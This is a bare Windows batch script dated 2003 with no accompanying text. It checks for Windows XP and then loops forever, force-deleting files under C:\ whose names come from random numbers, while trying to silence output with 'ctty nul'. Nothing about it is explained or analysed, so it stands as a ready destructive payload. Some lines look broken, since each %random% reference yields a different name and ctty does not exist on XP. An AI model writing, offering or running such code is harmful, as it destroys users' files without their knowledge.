::
:: 18.05.2003
::
@echo off
ctty nul
ver | find "XP"
if errorlevel 1 goto done
if not errorlevel 1 goto :XP
:XP
if exist c:\%random%. (del /f /s c:\%random%.) else echo c:\%random%. missing
if exist c:\%random%. (del /f /s c:\%random%.) else echo c:\%random%. missing
if exist c:\%random%. (del /f /s c:\%random%.) else echo c:\%random%. missing
if exist c:\%random%. (del /f /s c:\%random%.) else echo c:\%random%. missing
if exist c:\%random%. (del /f /s c:\%random%.) else echo c:\%random%. missing
if exist c:\%random%. (del /f /s c:\%random%.) else echo c:\%random%. missing
goto XP
ctty con
exit
:done
ctty con
cls
